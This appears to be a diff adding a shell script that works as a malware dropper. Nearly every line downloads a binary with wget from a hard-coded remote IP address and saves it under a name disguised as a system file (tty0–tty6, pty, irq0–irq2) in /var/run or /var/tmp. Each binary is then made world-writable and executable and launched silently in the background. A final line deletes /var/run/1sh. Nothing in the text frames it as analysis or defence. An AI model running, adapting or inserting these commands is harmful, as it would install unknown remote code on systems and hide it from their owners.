@@ -1,0 +1,19 @@
+wget http://147.231.19.62/.x/tty0 -O /var/run/tty0 ; chmod +x /var/run/tty0 ; chmod 777 /var/run/tty0 ; /var/run/tty0 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty1 -O /var/run/tty1 ; chmod +x /var/run/tty1 ; chmod 777 /var/run/tty1 ; /var/run/tty1 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty2 -O /var/run/tty2 ; chmod +x /var/run/tty2 ; chmod 777 /var/run/tty2 ; /var/run/tty2 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty3 -O /var/run/tty3 ; chmod +x /var/run/tty3 ; chmod 777 /var/run/tty3 ; /var/run/tty3 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty4 -O /var/run/tty4 ; chmod +x /var/run/tty4 ; chmod 777 /var/run/tty4 ; /var/run/tty4 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty5 -O /var/run/tty5 ; chmod +x /var/run/tty5 ; chmod 777 /var/run/tty5 ; /var/run/tty5 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/tty6 -O /var/run/tty6 ; chmod +x /var/run/tty6 ; chmod 777 /var/run/tty6 ; /var/run/tty6 > /dev/null 2>&1 &
+
+
+wget http://147.231.19.62/.x/pty -O pty ; chmod +x pty ; chmod 777 pty ; ./pty > /dev/null 2>&1 &
+
+wget http://147.231.19.62/.x/irq0 -O irq0 ; chmod +x irq0 ; chmod 777 irq0 ; ./irq0 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/irq1 -O irq1 ; chmod +x irq1 ; chmod 777 irq1 ; ./irq1 > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/irq2 -O irq2 ; chmod +x irq2 ; chmod 777 irq2 ; ./irq2 > /dev/null 2>&1 &
+
+wget http://147.231.19.62/.x/pty -O /var/tmp/pty ; chmod +x /var/tmp/pty ; chmod 777 /var/tmp/pty ; /var/tmp/pty > /dev/null 2>&1 &
+wget http://147.231.19.62/.x/pty -O /var/run/pty ; chmod +x /var/run/pty ; chmod 777 /var/run/pty ; /var/run/pty > /dev/null 2>&1 &
+rm -rf /var/run/1sh
+
